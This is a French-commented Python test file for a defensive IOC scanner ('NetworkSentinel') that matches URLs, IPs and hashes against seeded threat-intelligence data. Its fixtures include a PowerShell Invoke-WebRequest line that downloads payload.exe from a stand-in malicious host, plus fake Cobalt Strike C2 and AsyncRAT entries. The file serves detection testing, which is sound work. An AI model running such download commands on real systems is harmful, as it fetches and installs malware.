"""Tests Phase 3.e : sentinelle réseau qui extrait + matche les IOCs.

Couvre :
  - extraction URL/IP/hostname/hash depuis du texte
  - lookup correct contre IOCLookup
  - denylist hostnames (anti-faux-positifs)
  - dédoublonnage par (type, value)
  - truncation au-delà de max_bytes
  - decode binaire safe (latin-1 fallback)
  - intégration scanner.scan_path avec network_scan=True
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))


def _seed_lookup_db(db_path: Path) -> None:
    """Crée un mini index IOC pour les tests."""
    uh_dir = db_path / "urlhaus"
    uh_dir.mkdir(parents=True, exist_ok=True)
    (uh_dir / "hostnames.json").write_text(
        json.dumps({"malicious-domain.test": ["http://malicious-domain.test/x"]}),
        encoding="utf-8",
    )
    (uh_dir / "urls.json").write_text(
        json.dumps(
            [
                {
                    "url": "http://malicious-domain.test/payload.exe",
                    "hostname": "malicious-domain.test",
                    "url_status": "online",
                    "threat": "malware_download",
                    "tags": [],
                    "date_added": "2026-05-01",
                }
            ]
        ),
        encoding="utf-8",
    )
    tf_dir = db_path / "threatfox" / "by_type"
    tf_dir.mkdir(parents=True, exist_ok=True)
    (tf_dir / "ip.json").write_text(
        json.dumps(
            {
                "10.20.30.40:8080": {
                    "malware": "Cobalt Strike",
                    "threat_type": "c2_server",
                    "confidence": 100,
                    "source": "abuse.ch/ThreatFox",
                }
            }
        ),
        encoding="utf-8",
    )
    (tf_dir / "hash.json").write_text(
        json.dumps(
            {
                "f" * 64: {
                    "malware": "AsyncRAT",
                    "confidence": 90,
                    "source": "abuse.ch/ThreatFox",
                }
            }
        ),
        encoding="utf-8",
    )


def test_detects_url_in_text(tmp_path):
    from biocybe.network_sentinel import NetworkSentinel

    _seed_lookup_db(tmp_path)
    sentinel = NetworkSentinel.from_db(tmp_path)

    sample = tmp_path / "script.ps1"
    sample.write_text(
        "Invoke-WebRequest http://malicious-domain.test/payload.exe -OutFile a.exe",
        encoding="utf-8",
    )

    result = sentinel.scan_file(sample)
    assert result.is_malicious
    assert len(result.iocs_found) >= 1
    url_hits = [h for h in result.iocs_found if h.ioc_type == "url"]
    assert any("payload.exe" in h.value for h in url_hits)


def test_detects_ip_with_port(tmp_path):
    from biocybe.network_sentinel import NetworkSentinel

    _seed_lookup_db(tmp_path)
    sentinel = NetworkSentinel.from_db(tmp_path)

    sample = tmp_path / "config.txt"
    sample.write_text("c2_server=10.20.30.40:8080\nbackup=9.9.9.9", encoding="utf-8")

    result = sentinel.scan_file(sample)
    assert result.is_malicious
    ip_hits = [h for h in result.iocs_found if h.ioc_type == "ip"]
    assert any("10.20.30.40" in h.value for h in ip_hits)


def test_detects_hash_in_text(tmp_path):
    from biocybe.network_sentinel import NetworkSentinel

    _seed_lookup_db(tmp_path)
    sentinel = NetworkSentinel.from_db(tmp_path)

    sample = tmp_path / "ioc.txt"
    sample.write_text(f"Known bad hash: {'f' * 64}", encoding="utf-8")

    result = sentinel.scan_file(sample)
    hash_hits = [h for h in result.iocs_found if h.ioc_type == "hash"]
    assert len(hash_hits) == 1
    assert hash_hits[0].malware == "AsyncRAT"


def test_denylist_skips_common_hosts(tmp_path):
    from biocybe.network_sentinel import NetworkSentinel

    _seed_lookup_db(tmp_path)
    # On rajoute github.com comme malicieux dans le lookup pour vérifier
    # qu'il est skip via la denylist
    uh_hosts = tmp_path / "urlhaus" / "hostnames.json"
    data = json.loads(uh_hosts.read_text(encoding="utf-8"))
    data["github.com"] = ["http://github.com/x"]
    uh_hosts.write_text(json.dumps(data), encoding="utf-8")

    sentinel = NetworkSentinel.from_db(tmp_path)
    sample = tmp_path / "doc.md"
    sample.write_text("Voir https://github.com/foo/bar", encoding="utf-8")

    result = sentinel.scan_file(sample)
    # github.com en denylist → pas de hit hostname
    host_hits = [h for h in result.iocs_found if h.ioc_type == "hostname" and "github" in h.value]
    assert not host_hits


def test_dedup_same_ioc_multiple_occurrences(tmp_path):
    from biocybe.network_sentinel import NetworkSentinel

    _seed_lookup_db(tmp_path)
    sentinel = NetworkSentinel.from_db(tmp_path)

    sample = tmp_path / "noisy.txt"
    sample.write_text(
        "\n".join(
            [
                "10.20.30.40:8080",
                "Connection to 10.20.30.40:8080 retry",
                "10.20.30.40:8080 again",
            ]
        ),
        encoding="utf-8",
    )

    result = sentinel.scan_file(sample)
    ip_hits = [h for h in result.iocs_found if h.ioc_type == "ip"]
    assert len(ip_hits) == 1  # dédupliqué


def test_truncation_above_max_bytes(tmp_path):
    from biocybe.network_sentinel import NetworkSentinel

    _seed_lookup_db(tmp_path)
    sentinel = NetworkSentinel.from_db(tmp_path, max_bytes=1024)

    sample = tmp_path / "big.bin"
    # 2 KB de padding puis l'IOC à la fin (au-delà du cap)
    sample.write_bytes(b"x" * 2048 + b"10.20.30.40:8080")

    result = sentinel.scan_file(sample)
    assert result.truncated
    # L'IOC est après le cap → pas détecté
    assert not result.is_malicious


def test_binary_decode_safe(tmp_path):
    from biocybe.network_sentinel import NetworkSentinel

    _seed_lookup_db(tmp_path)
    sentinel = NetworkSentinel.from_db(tmp_path)

    sample = tmp_path / "weird.bin"
    # Mélange octets binaires + IOC ASCII
    sample.write_bytes(b"\x00\x01\xff\xfe" + b"10.20.30.40:8080" + b"\x80\x90")

    # Ne doit pas crasher, doit trouver l'IOC
    result = sentinel.scan_file(sample)
    assert result.is_malicious


def test_empty_lookup_no_scan(tmp_path):
    from biocybe.network_sentinel import NetworkSentinel

    # Pas de seed → lookup vide
    sentinel = NetworkSentinel.from_db(tmp_path)
    sample = tmp_path / "x.txt"
    sample.write_text("10.20.30.40:8080", encoding="utf-8")

    result = sentinel.scan_file(sample)
    assert not result.is_malicious
    assert result.error == "ioc_lookup_empty"


def test_scan_path_integration_with_network_scan(tmp_path):
    """Le scanner.scan_path doit propager les hits réseau."""
    from biocybe.scanner import scan_path

    _seed_lookup_db(tmp_path / "db" / "signatures")

    target_dir = tmp_path / "target"
    target_dir.mkdir()
    benign = target_dir / "ok.txt"
    benign.write_text("nothing here", encoding="utf-8")
    bad = target_dir / "bad.ps1"
    bad.write_text("download http://malicious-domain.test/payload.exe", encoding="utf-8")

    # On chdir pour que sync_yara_rules trouve la structure
    import os

    cwd = os.getcwd()
    os.chdir(tmp_path)
    try:
        verdicts = scan_path(
            target_dir,
            quarantine=False,
            sync_rules=False,
            network_scan=True,
            db_path=tmp_path / "db" / "signatures",
        )
    finally:
        os.chdir(cwd)

    by_name = {v.path.name: v for v in verdicts}
    assert "bad.ps1" in by_name
    assert by_name["bad.ps1"].is_malicious
    assert by_name["bad.ps1"].network is not None
    assert by_name["bad.ps1"].network.is_malicious

    # Le fichier bénin ne contient pas d'IOC
    if "ok.txt" in by_name:
        assert not by_name["ok.txt"].is_malicious


def test_cli_intel_stats(tmp_path, monkeypatch, capsys):
    from biocybe.cli import main

    _seed_lookup_db(tmp_path / "db" / "signatures")
    monkeypatch.chdir(tmp_path)

    exit_code = main(["intel", "stats"])
    assert exit_code == 0
    out = capsys.readouterr().out
    assert "Total" in out
    assert "URLs" in out


def test_cli_intel_lookup_hit(tmp_path, monkeypatch, capsys):
    from biocybe.cli import main

    _seed_lookup_db(tmp_path / "db" / "signatures")
    monkeypatch.chdir(tmp_path)

    exit_code = main(["intel", "lookup", "10.20.30.40", "--json"])
    assert exit_code == 0
    out = capsys.readouterr().out
    payload = json.loads(out)
    assert payload["match"] is not None
    assert payload["match"]["ioc_type"] == "ip"
    assert "Cobalt Strike" in payload["match"]["malware"]


def test_cli_intel_lookup_miss(tmp_path, monkeypatch, capsys):
    from biocybe.cli import main

    _seed_lookup_db(tmp_path / "db" / "signatures")
    monkeypatch.chdir(tmp_path)

    exit_code = main(["intel", "lookup", "99.99.99.99"])
    assert exit_code == 1  # no match → exit 1
    out = capsys.readouterr().out
    assert "Aucun match" in out


def test_cli_intel_lookup_empty_db(tmp_path, monkeypatch, capsys):
    from biocybe.cli import main

    monkeypatch.chdir(tmp_path)  # pas de seed
    exit_code = main(["intel", "lookup", "anything"])
    assert exit_code == 2  # base vide → exit 2
    err = capsys.readouterr().err
    assert "intel update" in err
